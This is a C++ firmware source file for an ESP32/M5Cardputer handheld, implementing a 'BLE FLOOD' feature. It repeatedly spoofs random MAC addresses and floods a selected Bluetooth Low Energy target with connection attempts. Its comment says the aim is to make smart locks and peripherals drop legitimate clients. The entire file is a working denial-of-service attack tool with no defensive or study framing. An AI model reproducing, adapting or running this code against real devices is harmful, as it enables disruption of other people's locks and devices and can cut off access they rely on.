/*
 * ble_flood — rapid connection flood against a target MAC.
 *
 * Uses g_ble_target. Spawns a task that cycles:
 *   random MAC -> gap_connect(target) -> cancel on success -> repeat.
 *
 * Defeats many BLE devices that can only hold a small number of
 * connections (smart locks, peripherals) — they get stuck processing
 * our bogus attempts and drop legitimate clients.
 */
#include "app.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "ble_types.h"
#include <NimBLEDevice.h>
#include <esp_random.h>

static volatile bool     s_flood_alive = false;
static volatile uint32_t s_flood_count = 0;

static int flood_cb(ble_gap_event *event, void *arg)
{
    (void)arg;
    if (event->type == BLE_GAP_EVENT_CONNECT) {
        if (event->connect.status == 0) {
            ble_gap_terminate(event->connect.conn_handle, BLE_ERR_REM_USER_CONN_TERM);
        }
    }
    return 0;
}

static void set_random_mac(void)
{
    uint8_t mac[6];
    for (int i = 0; i < 6; ++i) mac[i] = (uint8_t)esp_random();
    mac[0] |= 0xC0;
    ble_hs_id_set_rnd(mac);
}

static void flood_task(void *arg)
{
    (void)arg;
    ble_addr_t target;
    target.type = g_ble_target.is_public ? BLE_ADDR_PUBLIC : BLE_ADDR_RANDOM;
    /* ble_addr_t.val is little-endian; g_ble_target.addr is already LE. */
    memcpy(target.val, g_ble_target.addr, 6);

    while (s_flood_alive) {
        set_random_mac();
        int rc = ble_gap_connect(BLE_OWN_ADDR_RANDOM, &target, 200,
                                 nullptr, flood_cb, nullptr);
        s_flood_count++;
        if (rc == 0) {
            delay(150);
            ble_gap_conn_cancel();
        }
        delay(40);
    }
    vTaskDelete(nullptr);
}

void feat_ble_flood(void)
{
    if (!g_ble_target_valid) {
        ui_toast("scan + select first", COL_WARN, 1200);
        return;
    }
    radio_switch(RADIO_BLE);

    s_flood_count = 0;
    s_flood_alive = true;
    xTaskCreate(flood_task, "ble_flood", 4096, nullptr, 4, nullptr);

    ui_clear_body();
    auto &d = M5Cardputer.Display;
    d.setTextColor(COL_BAD, COL_BG);
    d.setCursor(4, BODY_Y + 2); d.print("BLE FLOOD");
    d.drawFastHLine(4, BODY_Y + 12, 80, COL_BAD);
    d.setTextColor(COL_FG, COL_BG);
    d.setCursor(4, BODY_Y + 22); d.printf("target %02X:%02X:%02X:%02X:%02X:%02X",
        g_ble_target.addr[0], g_ble_target.addr[1], g_ble_target.addr[2],
        g_ble_target.addr[3], g_ble_target.addr[4], g_ble_target.addr[5]);
    ui_draw_footer("`=stop");

    uint32_t last = 0;
    while (true) {
        if (millis() - last > 200) {
            last = millis();
            d.fillRect(0, BODY_Y + 40, 150, 30, COL_BG);
            d.setTextColor(COL_GOOD, COL_BG);
            d.setCursor(4, BODY_Y + 40);
            d.printf("attempts: %lu", (unsigned long)s_flood_count);
            ui_draw_status(radio_name(), "flood");
        }
        /* Matrix rain in right gutter while attacking. */
        ui_matrix_rain(160, BODY_Y + 18, SCR_W - 160, BODY_H - 20, 0xF81F);
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(30); continue; }
        if (k == PK_ESC) break;
    }
    s_flood_alive = false;
    delay(200);
}
